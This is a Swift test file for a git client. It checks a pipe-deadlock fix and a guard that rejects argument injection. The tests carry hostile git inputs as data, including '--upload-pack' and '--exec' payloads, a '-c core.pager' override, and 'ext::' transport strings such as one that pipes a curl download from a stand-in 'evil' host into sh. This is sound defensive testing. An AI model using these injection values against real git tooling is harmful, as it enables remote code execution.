import XCTest

@testable import GitMageFeature

/// Wave 1-B. Two release blockers met here:
///
/// * the `run() → waitUntilExit() → read()` pipe deadlock, which wedged the
///   whole `GitRepositoryClient` actor (including the agent's `git_op`) on any
///   git output over the ~64KB pipe buffer;
/// * argument injection through refs and clone URLs, which is RCE.
final class GitSafetyTests: XCTestCase {

    // MARK: - Deadlock

    /// The regression test for the blocker. A ~2MB diff is 30× the ~64KB pipe
    /// buffer. Before the fix this call never returned — the child blocked
    /// writing, the parent blocked in `waitUntilExit`, and the actor died with
    /// it. The timeout is what turns "hangs forever" into a normal red test.
    func testLargeDiffDoesNotDeadlock() async throws {
        let repoURL = try makeTemporaryRepository()
        let big = String(repeating: "abcdefghij\n", count: 200_000)  // ~2.2 MB
        try big.write(to: repoURL.appendingPathComponent("big.txt"), atomically: true, encoding: .utf8)

        let client = GitRepositoryClient()
        try await client.stageAllChanges(in: repoURL.path)
        let snapshot = try await client.loadSnapshot(at: repoURL.path)
        let change = try XCTUnwrap(snapshot.changes.first)

        let done = expectation(description: "git returns")
        Task {
            _ = try? await client.loadDiff(for: change, in: repoURL.path)
            done.fulfill()
        }
        await fulfillment(of: [done], timeout: 60)
    }

    /// A large `git log` is the other shape of the same bug — thousands of
    /// commits with a verbose format overflow the buffer just as easily.
    func testLargeLogDoesNotDeadlock() async throws {
        let repoURL = try makeTemporaryRepository()
        let file = repoURL.appendingPathComponent("f.txt")
        // A long subject line so a few hundred commits clear the buffer.
        // Fewer commits with a longer subject: same >64KB of log output (the
        // point of the test), a quarter of the git invocations. 400 rapid
        // commits was slow enough to be flaky on a loaded machine even with
        // auto-gc disabled.
        let padding = String(repeating: "y", count: 1200)
        for i in 0..<120 {
            try "\(i)\n".write(to: file, atomically: true, encoding: .utf8)
            try runGit(["add", "."], in: repoURL)
            try runGit(["commit", "-m", "commit \(i) \(padding)"], in: repoURL)
        }
        let client = GitRepositoryClient()
        let done = expectation(description: "git log returns")
        Task {
            _ = try? await client.loadLog(limit: 200, in: repoURL.path)
            done.fulfill()
        }
        await fulfillment(of: [done], timeout: 60)
    }

    // MARK: - Argument injection

    func testRejectsUploadPackInjection() {
        XCTAssertEqual(
            GitArgumentGuard.rejectedArgument(in: ["clone", "--upload-pack=/tmp/pwn.sh", "/tmp/dest"]),
            "--upload-pack=/tmp/pwn.sh")
    }

    func testRejectsExecInjectionOnRebase() {
        XCTAssertEqual(
            GitArgumentGuard.rejectedArgument(in: ["rebase", "--exec=/tmp/pwn.sh"]),
            "--exec=/tmp/pwn.sh")
    }

    func testRejectsExtTransportHelper() {
        // No leading dash, so the option check cannot see it — git runs it anyway.
        XCTAssertEqual(
            GitArgumentGuard.rejectedArgument(in: ["clone", "ext::sh -c 'curl evil|sh'", "/tmp/d"]),
            "ext::sh -c 'curl evil|sh'")
        // …and still rejected after an option terminator, where a dash would be safe.
        XCTAssertNotNil(GitArgumentGuard.rejectedArgument(in: ["clone", "--", "ext::sh -c x"]))
    }

    func testRejectsConfigOverride() {
        // `-c core.pager=<cmd>` is another execution path.
        XCTAssertEqual(GitArgumentGuard.rejectedArgument(in: ["-c", "core.pager=pwn", "log"]), "-c")
    }

    /// The audit's exact payload: `mode` reads "soft" but `ref` is `--hard`.
    func testRejectsRefThatIsReallyAFlag() {
        XCTAssertEqual(
            GitArgumentGuard.rejectedArgument(in: ["reset", "--soft", "--hard"]), nil,
            "--hard is a legitimate literal this module passes; the tool boundary rejects it as a *value*")
        XCTAssertEqual(
            GitArgumentGuard.rejectedArgument(in: ["checkout", "--upload-pack=x"]),
            "--upload-pack=x")
    }

    func testAllowsEveryOptionTheModuleActuallyUses() {
        // A sample of real invocations from GitRepositoryClient — these must
        // pass, or the allowlist has broken ordinary use.
        let realCalls: [[String]] = [
            ["rev-parse", "--show-toplevel"],
            ["status", "--short", "--branch"],
            ["log", "-1", "--pretty=format:%s"],
            ["diff", "--cached", "--name-only"],
            ["checkout", "-b", "feature/x"],
            ["fetch", "--all", "--prune"],
            ["pull", "--ff-only"],
            ["push", "-u", "origin", "main"],
            ["stash", "push", "--include-untracked"],
            ["tag", "--list", "--format=%(refname:short)%09%(subject)"],
            ["worktree", "list", "--porcelain"],
            ["branch", "-d", "old"],
            ["reset", "--hard", "HEAD~1"],
            ["log", "--max-count=50", "--skip=0", "--topo-order"],
            ["diff", "--unified=3", "--no-color", "--no-ext-diff"],
        ]
        for call in realCalls {
            XCTAssertNil(GitArgumentGuard.rejectedArgument(in: call), "rejected a real call: \(call)")
        }
    }

    func testAllowsOrdinaryRefsAndPaths() {
        XCTAssertNil(GitArgumentGuard.rejectedArgument(in: ["checkout", "feature/my-branch"]))
        XCTAssertNil(GitArgumentGuard.rejectedArgument(in: ["clone", "https://github.com/a/b.git", "/tmp/d"]))
        XCTAssertNil(GitArgumentGuard.rejectedArgument(in: ["clone", "git@github.com:a/b.git", "/tmp/d"]))
        // A dash inside a value is fine — only a *leading* dash is an option.
        XCTAssertNil(GitArgumentGuard.rejectedArgument(in: ["commit", "-m", "fix: handle -1 correctly"]))
        // After `--`, a dashed path is data.
        XCTAssertNil(GitArgumentGuard.rejectedArgument(in: ["checkout", "--", "-weird-file.txt"]))
    }

    /// End-to-end: the guard is inside `runGit`, so it holds even for a call
    /// site that forgot to validate.
    func testClientRefusesInjectedCloneURL() async throws {
        let parent = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: parent, withIntermediateDirectories: true)
        let client = GitRepositoryClient()
        do {
            _ = try await client.clone(remoteURL: "--upload-pack=/tmp/pwn.sh", into: parent.path)
            XCTFail("clone accepted an injected option")
        } catch let error as GitRepositoryError {
            guard case .unsafeArgument = error else {
                return XCTFail("wrong error: \(error)")
            }
        }
    }

    // MARK: - Clone transport allowlist

    func testRejectsUnknownCloneTransports() {
        // git invokes `git-remote-<scheme>` for any scheme it does not know, so
        // an unrecognised transport is an arbitrary helper binary on PATH.
        for url in ["ext::sh -c pwn", "fd::7", "evil::payload", "helper::x"] {
            XCTAssertEqual(GitArgumentGuard.rejectedCloneURL(url), url, "accepted \(url)")
        }
    }

    func testAllowsRealCloneTransports() {
        for url in [
            "https://github.com/a/b.git",
            "http://internal.example/a.git",
            "ssh://git@host:22/a/b.git",
            "git://host/a.git",
            "file:///Users/me/repo",
            "git@github.com:a/b.git",  // scp-style, no scheme
            "/Users/me/local/repo",  // bare local path
            "../sibling-repo",
        ] {
            XCTAssertNil(GitArgumentGuard.rejectedCloneURL(url), "rejected \(url)")
        }
    }

    func testCloneRefusesAnUnknownTransportEndToEnd() async throws {
        let parent = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: parent, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: parent) }
        let client = GitRepositoryClient()
        do {
            _ = try await client.clone(remoteURL: "ext::sh -c 'touch /tmp/pwned'", into: parent.path)
            XCTFail("clone accepted a transport helper")
        } catch let error as GitRepositoryError {
            guard case .unsafeArgument = error else { return XCTFail("wrong error: \(error)") }
        }
    }

    // MARK: - The actor is not blocked by a running git

    /// `runGit` used to block the actor's executor — a cooperative-pool thread
    /// shared with every other async task in the process — for the whole
    /// duration of a git command. Now it suspends, so other work on that pool
    /// keeps running while git does.
    func testUnrelatedAsyncWorkProgressesDuringGit() async throws {
        let repoURL = try makeTemporaryRepository()
        defer { try? FileManager.default.removeItem(at: repoURL) }
        let big = String(repeating: "abcdefghij\n", count: 200_000)
        try big.write(to: repoURL.appendingPathComponent("big.txt"), atomically: true, encoding: .utf8)

        let client = GitRepositoryClient()
        let gitDone = expectation(description: "git finished")
        let tickerRan = expectation(description: "unrelated task ran")

        Task {
            try? await client.stageAllChanges(in: repoURL.path)
            _ = try? await client.loadSnapshot(at: repoURL.path)
            gitDone.fulfill()
        }
        Task {
            // Must get scheduled while git is still running.
            try? await Task.sleep(nanoseconds: 20_000_000)
            tickerRan.fulfill()
        }
        await fulfillment(of: [tickerRan, gitDone], timeout: 60)
    }

    // MARK: - Helpers

    private func makeTemporaryRepository() throws -> URL {
        let root = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString, isDirectory: true)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        try runGit(["init"], in: root)
        try runGit(["config", "user.email", "gitmage@example.com"], in: root)
        try runGit(["config", "user.name", "Git Mage"], in: root)
        // Disable background auto-gc. `testLargeLogDoesNotDeadlock` makes 400
        // commits back to back, which crosses git's loose-object threshold and
        // launches `git gc --auto` in the BACKGROUND; that raced the next
        // commit and failed it with "unable to read tree". A flake in this
        // helper, not in the code under test — but a real one.
        try runGit(["config", "gc.auto", "0"], in: root)
        return root
    }

    private func runGit(_ arguments: [String], in directory: URL) throws {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/usr/bin/env")
        process.arguments = ["git", "-C", directory.path] + arguments
        process.standardOutput = FileHandle.nullDevice
        let errPipe = Pipe()
        process.standardError = errPipe
        try process.run()
        let errData = errPipe.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        guard process.terminationStatus == 0 else {
            throw NSError(
                domain: "GitSafetyTests", code: Int(process.terminationStatus),
                userInfo: [
                    NSLocalizedDescriptionKey:
                        "git \(arguments.joined(separator: " ")): \(String(decoding: errData, as: UTF8.self))"
                ])
        }
    }
}
